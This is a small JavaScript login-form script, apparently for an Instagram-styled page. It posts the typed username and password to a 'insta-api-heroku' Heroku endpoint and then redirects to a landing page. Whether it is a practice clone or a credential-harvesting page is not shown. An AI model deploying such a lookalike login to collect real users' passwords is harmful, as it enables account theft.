let id = document.querySelector(".id")
let pass = document.querySelector(".password")
let log = document.querySelector(".button")

function style_byID_Blue_short_p () {
    var textIn = pass.value
    var txtLen = textIn.length;
    console.log("hey")
    if( txtLen>8 ){
        log.className += ' blue'; //turn it blue
    } else {
        log.classList.remove('blue')
    }
}

setInterval(style_byID_Blue_short_p, 500)

log.addEventListener("click", () => {
    let user = {
        "id": id.value,
        "pass": pass.value 
    }
    fetch("https://insta-api-heroku.herokuapp.com/login", {
        method: 'post',
        body: JSON.stringify(user),
        headers: {
            'Content-Type': 'application/json',
          }
    }).then((resp) => {
        return resp.json();
    }).then((data) => {
        window.location.href = "/land.html"
        console.log("Sent!")
    })
})

